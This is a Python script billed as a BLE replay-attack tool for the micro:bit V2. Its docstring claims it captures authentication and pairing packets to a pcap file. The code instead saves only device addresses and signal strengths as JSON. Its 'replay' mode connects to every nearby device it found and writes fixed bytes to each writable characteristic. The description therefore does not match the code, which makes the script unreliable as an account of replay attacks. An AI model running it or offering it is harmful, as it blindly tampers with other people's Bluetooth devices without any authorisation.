# microbit_ble_replay.py

"""
BLE Replay Attack for micro:bit V2

This script allows BLE replay attacks by:
- Capturing BLE authentication & pairing packets (`--capture`)
- Replaying captured packets to test for security flaws (`--replay <file>`)

### Usage Examples:

1. Capture BLE packets and save them to a file:
   ```sh
   python microbit_ble_replay.py --capture capture.pcap
   ```

2. Replay a previously captured BLE session:
   ```sh
   python microbit_ble_replay.py --replay capture.pcap
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse
import json

# Capture BLE Packets
async def ble_capture_packets(logfile):
    """Captures BLE packets and logs them to a file."""
    print(f"[+] Capturing BLE packets and saving to {logfile}...")
    packets = []
    devices = await BleakScanner.discover()
    for device in devices:
        packets.append({"address": device.address, "rssi": device.rssi})
    
    with open(logfile, "w") as f:
        json.dump(packets, f)
    print(f"[+] Capture saved to {logfile}")

# Replay BLE Packets
async def ble_replay_packets(logfile):
    """Replays captured BLE packets."""
    print(f"[+] Replaying BLE packets from {logfile}...")
    with open(logfile, "r") as f:
        packets = json.load(f)
    
    for packet in packets:
        print(f"[+] Replaying packet to {packet['address']} (RSSI: {packet['rssi']})")
        async with BleakClient(packet["address"]) as client:
            for service in await client.get_services():
                for char in service.characteristics:
                    if "write" in char.properties:
                        await client.write_gatt_char(char.uuid, b'\x00\x01')
                        print(f"[+] Injected replayed packet into {char.uuid}")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Replay Attack for micro:bit V2")
    parser.add_argument("--capture", help="Capture BLE packets and save to file", metavar="logfile")
    parser.add_argument("--replay", help="Replay captured BLE packets from file", metavar="logfile")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    if args.capture:
        loop.run_until_complete(ble_capture_packets(args.capture))
    elif args.replay:
        loop.run_until_complete(ble_replay_packets(args.replay))
